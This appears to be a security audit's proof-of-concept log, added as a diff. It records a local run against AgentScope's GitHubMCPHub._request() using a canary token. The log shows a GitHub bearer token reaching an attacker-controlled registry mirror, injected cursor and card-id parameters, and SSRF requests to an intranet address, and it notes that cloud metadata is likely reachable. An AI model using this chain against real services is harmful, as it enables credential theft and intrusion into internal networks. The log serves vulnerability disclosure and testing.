@@ -1,0 +1,34 @@
+﻿# Transcript of "python poc/exp_logic.py" on this repository (2026-11-18, loopback only, canary token).
+# The original audit run against the unmodified AgentScope 2.0.11 service is in evidence/exp_real_api.log.
+
+AS-2026-006 · GitHubMCPHub._request() — local reproduction
+httpx available: False
+
+    [09:17:43] GET /v0/servers?limit=7&q=markdown&cursor=CURSOR-INJECTED-BY-ATTACKER UA=Python-urllib/3.12 AUTH=Bearer ghp_CANARY_REDACTED_TOKEN body=b''
+    [09:17:43] GET /v0/servers/CARD-ID-INJECTED-BY-ATTACKER UA=Python-urllib/3.12 AUTH=Bearer ghp_CANARY_REDACTED_TOKEN body=b''
+
+== REGISTRY MIRROR (attacker-controlled —— captured Token exfiltration) ==
+[09:17:43] GET /v0/servers?limit=7&q=markdown&cursor=CURSOR-INJECTED-BY-ATTACKER UA=Python-urllib/3.12 AUTH=Bearer ghp_CANARY_REDACTED_TOKEN body=b''
+[09:17:43] GET /v0/servers/CARD-ID-INJECTED-BY-ATTACKER UA=Python-urllib/3.12 AUTH=Bearer ghp_CANARY_REDACTED_TOKEN body=b''
+
+[VERDICT] EFFECT1_TOKEN_EXFIL = True (Bearer ghp_CANARY_REDACTED_TOKEN)
+[VERDICT] EFFECT3_PARAM_INJECTION = True (cursor in query: True, card_id in path: True)
+
+[setup] hub -> 127.0.0.1:18722 (no token configured)
+    [09:17:43] GET /v0/servers?limit=3&q=intranet-probe UA=Python-urllib/3.12 AUTH=- body=b''
+
+== INTRANET PROBE (GET issued by the server toward the intranet) ==
+[09:17:43] GET /v0/servers?limit=3&q=intranet-probe UA=Python-urllib/3.12 AUTH=- body=b''
+
+[VERDICT] EFFECT2_INTRANET_SSRF = True
+[VERDICT] EFFECT4_PURE_SSRF_NO_TOKEN = True (GET still issued, no Authorization header)
+
+[note] Cloud metadata (169.254.169.254): reachable through the same chain [Likely] —— _request() validates no target address, so httpx connects to any IP. A local probe stands in for it here.
+
+[VERDICT] EXP_SUCCESS = True
+{
+  "effect1_token_exfil": true,
+  "effect2_intranet_ssrf": true,
+  "effect3_param_injection": true,
+  "effect4_pure_ssrf_no_token": true
+}
